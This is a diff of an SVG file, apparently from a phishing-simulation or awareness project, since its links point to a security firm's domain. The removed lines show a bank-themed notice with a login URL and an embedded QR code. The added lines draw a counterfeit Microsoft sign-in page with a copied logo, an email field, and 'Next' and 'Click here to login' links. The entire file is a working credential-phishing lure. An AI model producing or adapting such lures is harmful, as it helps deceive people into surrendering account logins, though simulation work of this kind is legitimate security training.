@@ -1,7 +1,36 @@
-<svg width="300" height="400" xmlns="http://www.w3.org/2000/svg">
-  <text x="10" y="20" font-family="Arial" font-size="20" fill="red">Important</text>
-  <text x="10" y="50" font-family="Arial" font-size="16" fill="black">The New Internet Banking Can be Accessed on Following URL:</text>
-  <text x="10" y="80" font-family="Arial" font-size="16" fill="black">URL: https://www.nstcyber.ai</text>
-  <text x="10" y="110" font-family="Arial" font-size="16" fill="black">QR Code for Quick Access:</text>
-  <image x="10" y="130" width="200" height="200" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASIAAAEiAQAAAAB1xeIbAAABjElEQVR4nO2aQW6zMBCFv/cbqUtzgxwFrtwbwFFygErxshLodWGc9E8X7YZAgmcDmE/iaWSNZ56Q+T3Gf3+AoFKVqlSlKrV3Sks0QGqAVFb6TXUdgups2xdQHz+lnmDb9v/U43W9NNUs19RC9w4e2w9MAkGYNtN1BKq5exZx5S9WqsR97k16+9ny71X9a1DR9gBI7ZxPWNvTPfV4XQegRklSC3SXYGDObc7Wul6ayjXnVmVMmuXvK9voOg619PJJkk621M5ibOe679en7EtwLvo+N3hIDepTg/pNdb02de1zZnlUmCB+5t1uUltKz17VPzdFnl+H650vwR6iDWW49bBX9c9N5YxnT2EAIE7fStDyYq/qn5squ70EEOwhTgCh5n5NKtf70s8sBo6Iud6r1vv1qauPeZtmpTZUH/MRVFq8evVJ8pAaIFZP4bHUeHI5Zs/VU1iVuvcx6d4F3VmYVP37VamS+2ggldXxZARhO10Hom4+Zp6ozpKHMuHuXv2TUqr/RlWqUpWq1CGoLzCzxC/JfdzcAAAAAElFTkSuQmCC"/>
+<svg width="400" height="600" xmlns="http://www.w3.org/2000/svg">
+  <!-- Background -->
+  <rect width="400" height="600" fill="#f3f2f1" />
+  
+  <!-- Header -->
+  <rect width="100%" height="60" fill="#0078d4" />
+  <text x="50%" y="40" font-family="Arial" font-size="24" fill="white" text-anchor="middle">Microsoft</text>
+  
+  <!-- Sign-in box -->
+  <rect x="50" y="100" width="300" height="400" fill="white" stroke="#e1e1e1" stroke-width="1" />
+  
+  <!-- Logo -->
+  <rect x="170" y="130" width="60" height="60" fill="none" stroke="#e1e1e1" stroke-width="1" />
+  <rect x="175" y="135" width="25" height="25" fill="#f25022" />
+  <rect x="200" y="135" width="25" height="25" fill="#7fba00" />
+  <rect x="175" y="160" width="25" height="25" fill="#00a4ef" />
+  <rect x="200" y="160" width="25" height="25" fill="#ffb900" />
+  
+  <!-- Sign-in text -->
+  <text x="200" y="230" font-family="Arial" font-size="20" fill="#333" text-anchor="middle">Sign in</text>
+  
+  <!-- Email input -->
+  <rect x="80" y="260" width="240" height="40" fill="none" stroke="#e1e1e1" />
+  <text x="90" y="285" font-family="Arial" font-size="14" fill="#888">Email, phone, or Skype</text>
+  
+  <!-- Next button -->
+  <a href="https://www.nstcyber.ai/" target="_blank">
+    <rect x="80" y="320" width="240" height="40" fill="#0078d4" />
+    <text x="200" y="345" font-family="Arial" font-size="16" fill="white" text-anchor="middle">Next</text>
+  </a>
+  
+  <!-- Footer text -->
+  <a href="https://www.nstcyber.ai/" target="_blank">
+    <text x="50%" y="560" font-family="Arial" font-size="12" fill="#0078d4" text-anchor="middle">Click here to login</text>
+  </a>
 </svg>
